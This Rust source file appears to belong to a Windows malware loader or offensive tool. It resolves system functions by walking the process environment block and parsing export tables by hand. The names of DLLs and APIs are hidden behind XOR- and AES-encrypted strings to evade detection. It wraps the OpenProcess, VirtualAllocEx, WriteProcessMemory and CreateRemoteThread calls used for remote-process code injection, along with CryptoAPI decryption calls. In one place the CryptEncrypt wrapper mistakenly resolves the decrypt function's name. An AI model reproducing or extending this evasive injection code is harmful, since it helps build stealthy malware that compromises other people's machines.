#![allow(non_snake_case)]

use crate::consts::*;
use crate::crypto_util::*;
use crate::util::str_len;
use crate::winternals::*;
use std::arch::asm;
use std::mem::size_of;
use std::ptr::addr_of;

pub unsafe fn get_peb() -> *const PEB {
    let mut peb = 0usize;
    if cfg!(all(windows, target_arch = "x86_64")) {
        asm!(
        "mov {peb}, gs:0x60",
        peb = out(reg) peb,
        );
    } else if cfg!(all(windows, target_arch = "x86")) {
        asm!(
        "mov {peb}, fs:0x30",
        peb = out(reg) peb,
        );
    } else if cfg!(all(windows, target_arch = "aarch64")) {
        // asm!(
        // peb = out(reg) peb,
        // );
    };

    peb as *const PEB
}

pub unsafe fn GetModuleHandle(sModuleName: Vec<u8>) -> usize {

    let mut peb = get_peb();

    if sModuleName.is_empty() {
        return (*peb).ImageBaseAddress;
    }

    let Ldr = (*peb).Ldr;
    let pModuleList = addr_of!((*Ldr).InMemoryOrderModuleList);
    let pStartListEntry = (*pModuleList).Flink;
    let sModuleNameW = String::from_utf8(sModuleName)
        .unwrap()
        .encode_utf16()
        .collect::<Vec<u16>>();

    let mut pListEntry = pStartListEntry as *const LIST_ENTRY;
    while pListEntry != pModuleList {
        let pEntry =
            ((pListEntry as usize) - size_of::<LIST_ENTRY>()) as *const LDR_DATA_TABLE_ENTRY;

        // Debug code for printing out module names.
        // let buff = std::slice::from_raw_parts(
        //     (*pEntry).BaseDllName.Buffer,
        //     ((*pEntry).BaseDllName.Length / 2) as usize,
        // );
        // let str = String::from_utf16(buff).unwrap();
        // println!("{}", str);

        if &sModuleNameW[..]
            == std::slice::from_raw_parts(
                (*pEntry).BaseDllName.Buffer,
                ((*pEntry).BaseDllName.Length / 2) as usize,
            )
        {
            return (*pEntry).DllBase;
        }

        pListEntry = (*pListEntry).Flink;
    }

    0
}

pub unsafe fn GetProcAddress(hMod: usize, sProcName: &[u8]) -> usize {
    let pBaseAddr = hMod;
    let pDosHdr = pBaseAddr as *const IMAGE_DOS_HEADER;
    let pNTHdr = (pBaseAddr + (*pDosHdr).e_lfanew as usize) as *const IMAGE_NT_HEADERS;
    let pOptionalHdr = &(*pNTHdr).OptionalHeader;
    let pExportDataDir = &pOptionalHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    let pExportDirAddr =
        (pBaseAddr + pExportDataDir.VirtualAddress as usize) as *const IMAGE_EXPORT_DIRECTORY;

    let pEAT = (pBaseAddr + (*pExportDirAddr).AddressOfFunctions as usize) as *const u32;
    let pEATArray = std::slice::from_raw_parts(pEAT, (*pExportDirAddr).NumberOfFunctions as usize);

    let pFuncNameTbl = (pBaseAddr + (*pExportDirAddr).AddressOfNames as usize) as *const u32;
    let pHintsTbl = (pBaseAddr + (*pExportDirAddr).AddressOfNameOrdinals as usize) as *const u16;

    let mut pProcAddr = 0;

    let sOrdinalTest = (*(sProcName.as_ptr() as *const u32));
    if sOrdinalTest >> 16 == 0 {
        let ordinal = (*(sProcName.as_ptr() as *const u16)) as u32;
        let Base = (*pExportDirAddr).Base;

        if (ordinal < Base) || (ordinal >= Base + (*pExportDirAddr).NumberOfFunctions) {
            return 0;
        }

        pProcAddr = pBaseAddr + pEATArray[(ordinal - Base) as usize] as usize;
    } else {
        let pFuncNameTblArray =
            std::slice::from_raw_parts(pFuncNameTbl, (*pExportDirAddr).NumberOfNames as usize);

        for i in 0..(*pExportDirAddr).NumberOfNames as usize {
            let string_ptr = (pBaseAddr + pFuncNameTblArray[i] as usize) as *const u8;

            let len = str_len(string_ptr, MAX_PATH);
            if sProcName == std::slice::from_raw_parts(string_ptr, len) {
                let pHintsTblArray =
                    std::slice::from_raw_parts(pHintsTbl, (*pExportDirAddr).NumberOfNames as usize);
                pProcAddr = pBaseAddr + pEATArray[pHintsTblArray[i] as usize] as usize;
            }
        }
    }

    pProcAddr
}

pub unsafe fn OpenProcess(dwDesiredAccess: u32, bInheritHandle: u32, dwProcessId: u32) -> usize {
    let openProcess: OpenProcess = std::mem::transmute(GetProcAddress(
        GetModuleHandle(get_xor_encrypted_string(
            KERNEL32_DLL_POS,
            KERNEL32_DLL_KEY,
            KERNEL32_DLL_LEN,
        )),
        get_aes_encrypted_resource_bytes(OPENPROCESS_POS, OPENPROCESS_LEN).as_slice(),
    ));

    openProcess(dwDesiredAccess, bInheritHandle, dwProcessId)
}

pub unsafe fn CloseHandle(hObject: usize) -> bool {
    let closeHandle: CloseHandle = std::mem::transmute(GetProcAddress(
        GetModuleHandle(get_xor_encrypted_string(
            KERNEL32_DLL_POS,
            KERNEL32_DLL_KEY,
            KERNEL32_DLL_LEN,
        )),
        get_aes_encrypted_resource_bytes(CLOSEHANDLE_POS, CLOSEHANDLE_LEN).as_slice(),
    ));

    closeHandle(hObject)
}

pub unsafe fn LoadLibraryA(lpLibFileName: *const u8) -> usize {
    let loadLibraryA: LoadLibraryA = std::mem::transmute(GetProcAddress(
        GetModuleHandle(get_xor_encrypted_string(
            KERNEL32_DLL_POS,
            KERNEL32_DLL_KEY,
            KERNEL32_DLL_LEN,
        )),
        get_xor_encrypted_string(LOADLIBRARYA_POS, LOADLIBRARYA_KEY, LOADLIBRARYA_LEN).as_slice(),
    ));

    loadLibraryA(lpLibFileName)
}

pub unsafe fn CreateToolhelp32Snapshot(dwFlags: u32, th32ProcessID: u32) -> usize {
    let createToolhelp32Snapshot: CreateToolhelp32Snapshot = std::mem::transmute(GetProcAddress(
        GetModuleHandle(get_xor_encrypted_string(
            KERNEL32_DLL_POS,
            KERNEL32_DLL_KEY,
            KERNEL32_DLL_LEN,
        )),
        get_aes_encrypted_resource_bytes(
            CREATETOOLHELP32SNAPSHOT_POS,
            CREATETOOLHELP32SNAPSHOT_LEN,
        )
        .as_slice(),
    ));

    createToolhelp32Snapshot(dwFlags, th32ProcessID)
}

pub unsafe fn Process32First(hSnapshot: usize, lppe: *mut PROCESSENTRY32) -> bool {
    let process32First: Process32First = std::mem::transmute(GetProcAddress(
        GetModuleHandle(get_xor_encrypted_string(
            KERNEL32_DLL_POS,
            KERNEL32_DLL_KEY,
            KERNEL32_DLL_LEN,
        )),
        get_aes_encrypted_resource_bytes(PROCESS32FIRST_POS, PROCESS32FIRST_LEN).as_slice(),
    ));

    process32First(hSnapshot, lppe)
}

pub unsafe fn Process32Next(hSnapshot: usize, lppe: *mut PROCESSENTRY32) -> bool {
    let process32Next: Process32Next = std::mem::transmute(GetProcAddress(
        GetModuleHandle(get_xor_encrypted_string(
            KERNEL32_DLL_POS,
            KERNEL32_DLL_KEY,
            KERNEL32_DLL_LEN,
        )),
        get_aes_encrypted_resource_bytes(PROCESS32NEXT_POS, PROCESS32NEXT_LEN).as_slice(),
    ));

    process32Next(hSnapshot, lppe)
}

pub unsafe fn VirtualAllocEx(
    hProcess: usize,
    lpAddress: usize,
    dwSize: usize,
    flAllocationType: u32,
    flProtect: u32,
) -> usize {
    let virtualAllocEx: VirtualAllocEx = std::mem::transmute(GetProcAddress(
        GetModuleHandle(get_xor_encrypted_string(
            KERNEL32_DLL_POS,
            KERNEL32_DLL_KEY,
            KERNEL32_DLL_LEN,
        )),
        get_aes_encrypted_resource_bytes(VIRTUALALLOCEX_POS, VIRTUALALLOCEX_LEN).as_slice(),
    ));

    virtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect)
}

pub unsafe fn WriteProcessMemory(
    hProcess: usize,
    lpAddress: usize,
    lpBuffer: *const u8,
    nSize: usize,
    lpNumberOfBytesWritten: usize,
) -> bool {
    let writeProcessMemory: WriteProcessMemory = std::mem::transmute(GetProcAddress(
        GetModuleHandle(get_xor_encrypted_string(
            KERNEL32_DLL_POS,
            KERNEL32_DLL_KEY,
            KERNEL32_DLL_LEN,
        )),
        get_aes_encrypted_resource_bytes(WRITEPROCESSMEMORY_POS, WRITEPROCESSMEMORY_LEN).as_slice(),
    ));

    writeProcessMemory(hProcess, lpAddress, lpBuffer, nSize, lpNumberOfBytesWritten)
}

pub unsafe fn CreateRemoteThread(
    hProcess: usize,
    lpThreadAttributes: usize,
    dwStackSize: usize,
    lpStartAddress: usize,
    lpParameter: usize,
    dwCreationFlags: u32,
    lpThreadId: usize,
) -> usize {
    let createRemoteThread: CreateRemoteThread = std::mem::transmute(GetProcAddress(
        GetModuleHandle(get_xor_encrypted_string(
            KERNEL32_DLL_POS,
            KERNEL32_DLL_KEY,
            KERNEL32_DLL_LEN,
        )),
        get_aes_encrypted_resource_bytes(CREATEREMOTETHREAD_POS, CREATEREMOTETHREAD_LEN).as_slice(),
    ));

    createRemoteThread(
        hProcess,
        lpThreadAttributes,
        dwStackSize,
        lpStartAddress,
        lpParameter,
        dwCreationFlags,
        lpThreadId,
    )
}

pub unsafe fn WaitForSingleObject(hProcess: usize, dwMilliseconds: u32) -> u32 {
    let waitForSingleObject: WaitForSingleObject = std::mem::transmute(GetProcAddress(
        GetModuleHandle(get_xor_encrypted_string(
            KERNEL32_DLL_POS,
            KERNEL32_DLL_KEY,
            KERNEL32_DLL_LEN,
        )),
        get_aes_encrypted_resource_bytes(WAITFORSINGLEOBJECT_POS, WAITFORSINGLEOBJECT_LEN)
            .as_slice(),
    ));

    waitForSingleObject(hProcess, dwMilliseconds)
}

pub unsafe fn CryptAcquireContextW(
    phProv: *mut usize,
    szContainer: usize,
    szProvider: *const u16,
    dwProvType: u32,
    dwFlags: u32,
) -> bool {
    let cryptAcquireContextW: CryptAcquireContextW = std::mem::transmute(GetProcAddress(
        GetModuleHandle(get_xor_encrypted_string(
            ADVAPI32_DLL_POS,
            ADVAPI32_DLL_KEY,
            ADVAPI32_DLL_LEN,
        )),
        get_xor_encrypted_string(
            CRYPTACQUIRECONTEXTW_POS,
            CRYPTACQUIRECONTEXTW_KEY,
            CRYPTACQUIRECONTEXTW_LEN,
        )
        .as_slice(),
    ));

    cryptAcquireContextW(phProv, szContainer, szProvider, dwProvType, dwFlags)
}

pub unsafe fn CryptCreateHash(
    phProv: usize,
    ALG_ID: u32,
    hKey: usize,
    dwFlags: u32,
    phHash: *mut usize,
) -> bool {
    let cryptCreateHash: CryptCreateHash = std::mem::transmute(GetProcAddress(
        GetModuleHandle(get_xor_encrypted_string(
            ADVAPI32_DLL_POS,
            ADVAPI32_DLL_KEY,
            ADVAPI32_DLL_LEN,
        )),
        get_xor_encrypted_string(
            CRYPTCREATEHASH_POS,
            CRYPTCREATEHASH_KEY,
            CRYPTCREATEHASH_LEN,
        )
        .as_slice(),
    ));

    cryptCreateHash(phProv, ALG_ID, hKey, dwFlags, phHash)
}

pub unsafe fn CryptHashData(hHash: usize, pbData: *const u8, dwDataLen: u32, dwFlags: u32) -> bool {
    let cryptHashData: CryptHashData = std::mem::transmute(GetProcAddress(
        GetModuleHandle(get_xor_encrypted_string(
            ADVAPI32_DLL_POS,
            ADVAPI32_DLL_KEY,
            ADVAPI32_DLL_LEN,
        )),
        get_xor_encrypted_string(CRYPTHASHDATA_POS, CRYPTHASHDATA_KEY, CRYPTHASHDATA_LEN)
            .as_slice(),
    ));

    cryptHashData(hHash, pbData, dwDataLen, dwFlags)
}

pub unsafe fn CryptDeriveKey(
    hHash: usize,
    Algid: u32,
    hBaseData: usize,
    dwFlags: u32,
    phKey: *mut usize,
) -> bool {
    let cryptDeriveKey: CryptDeriveKey = std::mem::transmute(GetProcAddress(
        GetModuleHandle(get_xor_encrypted_string(
            ADVAPI32_DLL_POS,
            ADVAPI32_DLL_KEY,
            ADVAPI32_DLL_LEN,
        )),
        get_xor_encrypted_string(CRYPTDERIVEKEY_POS, CRYPTDERIVEKEY_KEY, CRYPTDERIVEKEY_LEN)
            .as_slice(),
    ));

    cryptDeriveKey(hHash, Algid, hBaseData, dwFlags, phKey)
}

pub unsafe fn CryptSetKeyParam(hKey: usize, dwParam: u32, pbData: *const u8, dwFlags: u32) -> bool {
    let cryptSetKeyParam: CryptSetKeyParam = std::mem::transmute(GetProcAddress(
        GetModuleHandle(get_xor_encrypted_string(
            ADVAPI32_DLL_POS,
            ADVAPI32_DLL_KEY,
            ADVAPI32_DLL_LEN,
        )),
        get_xor_encrypted_string(
            CRYPTSETKEYPARAM_POS,
            CRYPTSETKEYPARAM_KEY,
            CRYPTSETKEYPARAM_LEN,
        )
        .as_slice(),
    ));

    cryptSetKeyParam(hKey, dwParam, pbData, dwFlags)
}

pub unsafe fn CryptDecrypt(
    hKey: usize,
    hHash: usize,
    Final: u32,
    dwFlags: u32,
    pbData: *mut u8,
    pdwDataLen: *mut u32,
) -> bool {
    let cryptDecrypt: CryptDecrypt = std::mem::transmute(GetProcAddress(
        GetModuleHandle(get_xor_encrypted_string(
            ADVAPI32_DLL_POS,
            ADVAPI32_DLL_KEY,
            ADVAPI32_DLL_LEN,
        )),
        get_xor_encrypted_string(CRYPTDECRYPT_POS, CRYPTDECRYPT_KEY, CRYPTDECRYPT_LEN).as_slice(),
    ));

    cryptDecrypt(hKey, hHash, Final, dwFlags, pbData, pdwDataLen)
}

pub unsafe fn CryptEncrypt(
    hKey: usize,
    hHash: usize,
    Final: u32,
    dwFlags: u32,
    pbData: *mut u8,
    pdwDataLen: *mut u32,
    dwBufLen: u32,
) -> bool {
    let cryptEncrypt: CryptEncrypt = std::mem::transmute(GetProcAddress(
        GetModuleHandle(get_xor_encrypted_string(
            ADVAPI32_DLL_POS,
            ADVAPI32_DLL_KEY,
            ADVAPI32_DLL_LEN,
        )),
        get_xor_encrypted_string(CRYPTDECRYPT_POS, CRYPTDECRYPT_KEY, CRYPTDECRYPT_LEN).as_slice(),
    ));

    cryptEncrypt(hKey, hHash, Final, dwFlags, pbData, pdwDataLen, dwBufLen)
}

pub unsafe fn CryptReleaseContext(hProv: usize, dwFlags: u32) -> bool {
    let cryptReleaseContext: CryptReleaseContext = std::mem::transmute(GetProcAddress(
        GetModuleHandle(get_xor_encrypted_string(
            ADVAPI32_DLL_POS,
            ADVAPI32_DLL_KEY,
            ADVAPI32_DLL_LEN,
        )),
        get_xor_encrypted_string(
            CRYPTRELEASECONTEXT_POS,
            CRYPTRELEASECONTEXT_KEY,
            CRYPTRELEASECONTEXT_LEN,
        )
        .as_slice(),
    ));

    cryptReleaseContext(hProv, dwFlags)
}

pub unsafe fn CryptDestroyKey(hKey: usize) -> bool {
    let cryptDestroyKey: CryptDestroyKey = std::mem::transmute(GetProcAddress(
        GetModuleHandle(get_xor_encrypted_string(
            ADVAPI32_DLL_POS,
            ADVAPI32_DLL_KEY,
            ADVAPI32_DLL_LEN,
        )),
        get_xor_encrypted_string(
            CRYPTDESTROYKEY_POS,
            CRYPTDESTROYKEY_KEY,
            CRYPTDESTROYKEY_LEN,
        )
        .as_slice(),
    ));

    cryptDestroyKey(hKey)
}

pub unsafe fn CryptDestroyHash(hHash: usize) -> bool {
    let cryptDestroyHash: CryptDestroyHash = std::mem::transmute(GetProcAddress(
        GetModuleHandle(get_xor_encrypted_string(
            ADVAPI32_DLL_POS,
            ADVAPI32_DLL_KEY,
            ADVAPI32_DLL_LEN,
        )),
        get_xor_encrypted_string(
            CRYPTDESTROYHASH_POS,
            CRYPTDESTROYHASH_KEY,
            CRYPTDESTROYHASH_LEN,
        )
        .as_slice(),
    ));

    cryptDestroyHash(hHash)
}

pub unsafe fn GetLastError() -> u32 {
    let getLastError: GetLastError = std::mem::transmute(GetProcAddress(
        GetModuleHandle(get_xor_encrypted_string(
            KERNEL32_DLL_POS,
            KERNEL32_DLL_KEY,
            KERNEL32_DLL_LEN,
        )),
        get_aes_encrypted_resource_bytes(GETLASTERROR_POS, GETLASTERROR_LEN).as_slice(),
    ));

    getLastError()
}

pub unsafe fn MessageBoxA(hWnd: usize, lpText: *const u8, lpCaption: *const u8, uType: u32) -> u32 {
    let messageBoxA: MessageBoxA = std::mem::transmute(GetProcAddress(
        GetModuleHandle(get_aes_encrypted_resource_bytes(
            USER32_DLL_POS,
            USER32_DLL_LEN,
        )),
        get_aes_encrypted_resource_bytes(MESSAGEBOXA_POS, MESSAGEBOXA_LEN).as_slice(),
    ));

    messageBoxA(hWnd, lpText, lpCaption, uType)
}
